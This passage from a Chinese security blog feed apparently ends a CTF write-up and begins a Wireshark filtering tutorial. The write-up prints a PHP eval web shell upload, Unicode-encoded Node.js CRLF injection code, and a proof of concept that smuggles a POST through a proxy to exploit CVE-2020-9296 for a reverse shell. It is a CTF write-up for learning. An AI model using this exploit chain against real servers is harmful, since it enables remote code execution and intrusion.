Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_encode</span>(<span class="params">raw</span>):</span></span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ</span></span><br></pre></td></tr></table></figure><p>构造请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(<span class="string">&#x27;http://192.168.123.37:2233/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc -lv 0.0.0.0 2233</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="built_in">test</span>: HTTP/1.1</span><br><span class="line">Host: 192.168.123.37:2233</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。</p><p>至此，完成了 nodejs CRLF 注入复现</p><h3 id="再次回到题目中"><a href="#再次回到题目中" class="headerlink" title="再次回到题目中"></a>再次回到题目中</h3><p>现在我们可以通过 题目的 <code>GET</code> 代理发送 <code>POST</code>请求（假如题目中的 node 版本是 &lt; 9），现在尝试利用漏洞，看看是否能利用成功。</p><p>构造 POC，node 或 F12 控制运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// netflix 的内网 IP 地址</span><br><span class="line">netflix_host = <span class="string">&quot;10.0.49.14&quot;</span></span><br><span class="line">// 在复现 CVE-<span class="number">2020</span>-<span class="number">9296</span> 时生成的 BCEL 编码</span><br><span class="line">bcel_evil = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">// 以下不用改</span><br><span class="line">post_payload = <span class="string">&#x27;[\u&#123;017b&#125;\u&#123;0122&#125;name\u&#123;0122&#125;:\u&#123;0122&#125;$\u&#123;017b&#125;\u&#123;0127&#125;1\u&#123;0127&#125;.getClass().forName(\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\u&#123;0127&#125;).newInstance().loadClass(\u&#123;0127&#125;&#x27;</span> +  bcel_evil + <span class="string">&#x27;\u&#123;0127&#125;).newInstance().class\u&#123;017d&#125;\u&#123;0122&#125;,\u&#123;0122&#125;ownerEmail\u&#123;0122&#125;:\u&#123;0122&#125;test@example.org\u&#123;0122&#125;,\u&#123;0122&#125;retryCount\u&#123;0122&#125;:\u&#123;0122&#125;3\u&#123;0122&#125;,\u&#123;0122&#125;timeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;1200\u&#123;0122&#125;,\u&#123;0122&#125;inputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;sourceRequestId\u&#123;0122&#125;,\u&#123;0122&#125;qcElementType\u&#123;0122&#125;],\u&#123;0122&#125;outputKeys\u&#123;0122&#125;:[\u&#123;0122&#125;state\u&#123;0122&#125;,\u&#123;0122&#125;skipped\u&#123;0122&#125;,\u&#123;0122&#125;result\u&#123;0122&#125;],\u&#123;0122&#125;timeoutPolicy\u&#123;0122&#125;:\u&#123;0122&#125;TIME_OUT_WF\u&#123;0122&#125;,\u&#123;0122&#125;retryLogic\u&#123;0122&#125;:\u&#123;0122&#125;FIXED\u&#123;0122&#125;,\u&#123;0122&#125;retryDelaySeconds\u&#123;0122&#125;:\u&#123;0122&#125;600\u&#123;0122&#125;,\u&#123;0122&#125;responseTimeoutSeconds\u&#123;0122&#125;:\u&#123;0122&#125;3600\u&#123;0122&#125;,\u&#123;0122&#125;concurrentExecLimit\u&#123;0122&#125;:\u&#123;0122&#125;100\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitFrequencyInSeconds\u&#123;0122&#125;:\u&#123;0122&#125;60\u&#123;0122&#125;,\u&#123;0122&#125;rateLimitPerFrequency\u&#123;0122&#125;:\u&#123;0122&#125;50\u&#123;0122&#125;,\u&#123;0122&#125;isolationgroupId\u&#123;0122&#125;:\u&#123;0122&#125;myIsolationGroupId\u&#123;0122&#125;\u&#123;017d&#125;]&#x27;</span></span><br><span class="line"></span><br><span class="line">encode_post_payload = encodeURI(<span class="string">&#x27;http://0.0.0.0:3000/\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;POST\u&#123;0120&#125;/search?url=http://&#x27;</span> + netflix_host + <span class="string">&#x27;:8080/api/metadata/taskdefs\u&#123;0120&#125;HTTP/1.1\u&#123;010D&#125;\u&#123;010A&#125;Host:127.0.0.1:3000\u&#123;010D&#125;\u&#123;010A&#125;Content-Type:application/json\u&#123;010D&#125;\u&#123;010A&#125;Content-Length:&#x27;</span> + post_payload.length + <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;&#x27;</span> + post_payload+ <span class="string">&#x27;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;\u&#123;010D&#125;\u&#123;010A&#125;GET\u&#123;0120&#125;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&quot;GET /proxy?url=&quot;</span> + encode_post_payload + <span class="string">&quot; HTTP/1.1&quot;</span></span><br><span class="line"></span><br><span class="line">console.log(poc)</span><br></pre></td></tr></table></figure><p>这里的 encodeURI 编码 1 次是防止传输过程中特殊字符被干掉 。</p><p><code>console.log(poc)</code> 输出的东西替换 HTTP 包第一行即可。</p><p><img src="/img/2021hfctf/image-20210424120721588.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424120721588.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424120721588"></p><p>成功反弹</p><p><img src="/img/2021hfctf/image-20210424000231228.png" class="lazyload" data-srcset="/img/2021hfctf/image-20210424000231228.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424000231228"></p><p>这个题目流程有点多，做个小总结</p><ul><li>nodejs 数组绕过管理员登录</li><li> <code>isPublic</code> 绕过，通过 /proxy 获取 /flag 得到提示</li><li>通过 docker 默认网段，或者题目给的提示 fuzz 内网网段的8080端口</li><li>构造 CVE-2020-9296 Netflix  Post POC 反弹 shell </li><li>利用 nodejs &lt; 9 进行 CRLF注入，发送 CVE-2020-9296 Netflix  Post POC </li><li>最终通过 cat /flag 获取 flag</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark入门与实战</title>
      <link href="//p/2021/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
      <url>//p/2021/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>wireshark入门: <a href="https://www.bilibili.com/video/BV1X5411x7R4">https://www.bilibili.com/video/BV1X5411x7R4</a><br>他这里顺序有点误，应该是 P1-P26，P32-P39，P27-P31<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656841-61d27bdc-5155-4965-b349-3cf88782698c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><h1 id="Wireshark-入门"><a href="#Wireshark-入门" class="headerlink" title="Wireshark 入门"></a>Wireshark 入门</h1><h2 id="伯克利包过滤-Wireshark包过滤"><a href="#伯克利包过滤-Wireshark包过滤" class="headerlink" title="伯克利包过滤 - Wireshark包过滤"></a>伯克利包过滤 - Wireshark包过滤</h2><p>BPF（Berkeley Packet Filter） 采用与自然语言相近的语法，利用语法构造字符串确定保留具体符合规则的数据包而忽略其他数据包</p><p>最简单语法空白字符，任何数据包都符合空白字符规则</p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><ul><li>type表示对象 如 IP地址、子网或端口 -&gt; host、net、port</li><li>dir 表示数据包传输的方向 -&gt; src、dst</li><li>proto 表示与数据包匹配的协议类型 -&gt; ether、ip、tcp、arp</li></ul><h3 id="演示实例"><a href="#演示实例" class="headerlink" title="演示实例"></a>演示实例</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403656706-a2c7be3e-a13f-4e9f-8aab-d43c34f7eb2f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">会发现直接在 Apply a display filter 里输入是无法过滤的，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596923337-d58d67de-11ac-40bc-b8f2-db9247089e3a.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=2030&size=49871&status=done&style=none&width=1015" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>新版的 wireshark 的 expression 功能在如下图所示这里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597076739-900b2bb3-44ab-4f94-9ec3-bf9505a48b59.png#align=left&display=inline&height=1560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1560&originWidth=1364&size=294373&status=done&style=none&width=1364" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>在 wireshark 里，不是直接使用 host 来表示主机名和对应的 ip 地址，而是使用 <code>ip.addr = &lt;ip&gt;</code> 来表示<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597207635-3bdda931-5a71-4992-9606-8571a61abf33.png#align=left&display=inline&height=538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1076&originWidth=2048&size=415173&status=done&style=none&width=1024" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>其他也是类似，如 <code>ip.src</code> 和 <code>ip.dst</code></p><p>在找服务这一块，服务都是以占用端口的形式展示的，因此可以通过这种形式来看怎么用，然后点OK即可。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597599273-503985ea-6cb9-4db9-ab74-510f0be84fe4.png#align=left&display=inline&height=790&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1580&originWidth=1382&size=225399&status=done&style=none&width=691" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597669802-2e2afe27-0f4e-46fa-89da-02a723a37013.png#align=left&display=inline&height=147&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=1858&size=103612&status=done&style=none&width=929" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>也可以使用 逻辑运算符实现筛选，如 <code>tcp.port == 80 and ip.src == 192.168.123.37</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597781937-1d89cd2f-0eb3-41f1-a3bb-df0d14953671.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1776&size=148999&status=done&style=none&width=888" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>当然也有类似补全的操作<br><img 